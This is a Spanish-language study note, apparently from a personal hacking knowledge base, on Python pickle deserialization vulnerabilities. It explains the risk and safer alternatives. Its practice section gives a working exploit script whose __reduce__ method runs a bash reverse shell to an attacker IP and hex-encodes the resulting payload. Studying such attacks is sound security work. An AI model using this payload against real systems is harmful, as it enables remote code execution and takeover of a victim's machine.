---
aliases:
  - Deserialización Pickle
  - DES-Pickle Attack
  - Python Pickle Vulnerability
tags:
  - hacking/explotacion
  - programacion/python
estado: 🟢 Terminado
---
# Ataque de Deserialización Pickle (DES-Pickle)

Un ataque de **Deserialización Pickle** (**DES-Pickle**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca `pickle` para serializar y deserializar objetos.

> [!info] ¿Qué es `pickle`?
> El módulo `pickle` implementa protocolos binarios para serializar y deserializar una estructura de objetos de Python. La serialización es el proceso de convertir un objeto Python en un flujo de bytes para almacenarlo o transmitirlo. La deserialización es el proceso inverso, reconstruyendo el objeto original a partir del flujo de bytes. Es importante destacar que `pickle` no está diseñado para ser seguro contra datos maliciosos o construidos de forma incorrecta.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada `pickle` que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada `pickle`, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Pickle para realizar ataques de denegación de servicio (DoS), inyectar código malicioso o incluso tomar el control completo del sistema.

El impacto de un ataque de Deserialización Pickle depende del tipo y la sensibilidad de los datos que se puedan obtener, pero puede ser muy grave. Por lo tanto, es importante que los desarrolladores de aplicaciones Python validen y filtren de forma adecuada la entrada `pickle` que se pasa a las funciones de deserialización, y que utilicen técnicas de seguridad como la limitación de recursos para prevenir ataques DoS y la desactivación de la deserialización automática de objetos no confiables.

> [!warning] Riesgos de `pickle.load()`
> La función `pickle.load()` es intrínsecamente insegura cuando se utiliza con datos no confiables. Puede ejecutar código arbitrario durante la deserialización. Para datos no confiables, se recomienda encarecidamente no usar `pickle` o, si es absolutamente necesario, implementar estrictas validaciones y sandboxing. Alternativas más seguras para la serialización de datos incluyen JSON o YAML, que no permiten la ejecución de código arbitrario por diseño.

## Notas de Práctica

![[Pasted image 20260227192639.png]]

Por detrás, está configurado `pickle`, el problema es que usa la función vulnerable de `pickle.load()`.

Lo que vamos a hacer es crearnos un archivo `exploit.py`:

```python
import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        # Este método es llamado por pickle durante la serialización para determinar cómo serializar el objeto.
        # Aquí, se le indica a pickle que, al deserializar, ejecute os.system con el comando especificado.
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.1.79/443 0>&1"',))

if __name__ == '__main__':
    # pickle.dumps serializa el objeto Exploit en un flujo de bytes.
    # binascii.hexlify convierte esos bytes a su representación hexadecimal para facilitar su uso como payload.
    print(binascii.hexlify(pickle.dumps(Exploit())))
```

> [!tip] El método `__reduce__`
> El método mágico `__reduce__` en Python es parte del protocolo de serialización de `pickle`. Cuando `pickle` intenta serializar un objeto, si el objeto tiene un método `__reduce__`, `pickle` lo llama para obtener una tupla que describe cómo reconstruir el objeto. Esta tupla puede contener una función y sus argumentos, lo que permite la ejecución de código arbitrario si la función y los argumentos son controlados por un atacante. En este exploit, `os.system` es la función y el comando de reverse shell es el argumento.

Lo que podemos observar es un código donde manipulamos `__reduce__`, el cual es una función mediante la cual se pueden ejecutar comandos. Lo que vamos a hacer es ahora imprimir el objeto con `pickle` y además ponerlo en formato hexadecimal para que sea válido:

![[Pasted image 20260227193742.png]]

Como observamos, ya tenemos una carga útil y, si estamos en escucha, podemos intentar realizar la conexión.
